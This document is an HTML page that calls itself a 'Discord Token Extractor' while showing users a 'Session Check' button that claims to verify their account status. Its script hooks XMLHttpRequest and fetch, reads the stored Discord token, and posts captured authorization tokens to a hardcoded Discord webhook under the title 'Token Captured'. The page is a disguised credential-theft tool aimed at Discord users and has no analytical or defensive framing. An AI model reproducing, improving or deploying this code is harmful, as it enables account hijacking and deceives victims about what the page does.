<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Token Extractor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #36393f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #2f3136;
            padding: 32px;
            border-radius: 5px;
            max-width: 600px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 16px;
        }
        p {
            color: #b9bbbe;
            margin-bottom: 24px;
        }
        button {
            padding: 12px 24px;
            background-color: #5865f2;
            border: none;
            border-radius: 3px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #4752c4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord Session Check</h1>
        <p>Click the button below while on the Discord website to check your session. This will verify your account status.</p>
        <button onclick="runTokenExtractor()">Run Session Check</button>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1375083886199181353/1dK2QCQMfKi6zYZ46tEWDuy_vCsm5wUy3_YLxOEGFjns__v77Gw7IsWrdcCmiwaBVLKb"; // Replace with a valid Discord webhook URL

        function runTokenExtractor() {
            if (!window.location.href.includes("discord.com")) {
                alert("Please run this on discord.com (e.g., https://discord.com/channels/@me)");
                window.open("https://discord.com/channels/@me", "_blank");
                return;
            }

            // Inject token extraction script
            (function() {
                // Override XMLHttpRequest
                const originalOpen = XMLHttpRequest.prototype.open;
                XMLHttpRequest.prototype.open = function() {
                    this.addEventListener("readystatechange", function() {
                        if (
                            this.readyState === 4 &&
                            this.responseURL.includes("discord.com/api") &&
                            this.getRequestHeader("Authorization")
                        ) {
                            const token = this.getRequestHeader("Authorization");
                            if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                sendToWebhook(token, "Network Request");
                            }
                        }
                    }, false);
                    originalOpen.apply(this, arguments);
                };

                // Override fetch
                const originalFetch = window.fetch;
                window.fetch = async function(url, options = {}) {
                    if (url.includes("discord.com/api")) {
                        const token = options.headers?.Authorization || (options.headers?.authorization);
                        if (token && (token.includes(".") || token.startsWith("mfa."))) {
                            sendToWebhook(token, "Network Request");
                        }
                    }
                    return originalFetch.apply(this, arguments);
                };

                // Send token to webhook
                async function sendToWebhook(token, source) {
                    const payload = {
                        content: "",
                        embeds: [{
                            title: "Token Captured",
                            description: `**Token**: ${token.substring(0, 10)}...\n**Source**: ${source}\n**Captured At**: ${new Date().toISOString()}`,
                            color: 0x7289da
                        }],
                        username: "Token Extractor",
                        avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
                    };

                    try {
                        await fetch(WEBHOOK_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(payload)
                        });
                    } catch (error) {
                        console.error("Webhook error:", error);
                    }
                }

                // Trigger API request
                fetch("https://discord.com/api/v9/users/@me", {
                    headers: { Authorization: localStorage.getItem("token") || "" }
                }).catch(() => {});
            })();

            alert("Session check initiated. You may close this page.");
        }
    </script>
</body>
</html>
